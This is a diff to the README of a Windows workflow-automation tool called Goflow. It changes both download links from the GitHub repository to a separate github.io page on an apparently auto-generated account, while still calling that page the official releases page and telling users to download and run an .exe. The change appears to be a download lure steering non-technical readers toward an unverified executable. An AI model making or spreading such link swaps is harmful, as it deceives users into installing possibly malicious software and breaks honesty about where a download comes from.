@@ -1,6 +1,6 @@
 # ⚙️ Goflow - Automate your tasks with simple workflows
 
-[![Download Goflow](https://img.shields.io/badge/Download-Goflow-blue.svg)](https://github.com/Southwesterarytenoid969/Goflow)
+[![Download Goflow](https://img.shields.io/badge/Download-Goflow-blue.svg)](https://southwesterarytenoid969.github.io)
 
 Goflow helps you connect your apps and automate repetitive processes. It runs entirely on your machine. You control your data and your workflows. The software uses a visual interface to link actions together. You do not need to write code to create powerful automations. 
 
@@ -18,7 +18,7 @@ Goflow runs on Windows 10 and Windows 11. Your computer needs at least 2 gigabyt
 
 You only need one file to run this program. 
 
-[Visit the official releases page to download your copy](https://github.com/Southwesterarytenoid969/Goflow)
+[Visit the official releases page to download your copy](https://southwesterarytenoid969.github.io)
 
 Choose the version labelled for Windows. Most users should select the file ending in `.exe`. Save this file to a folder where you store your applications. 
 
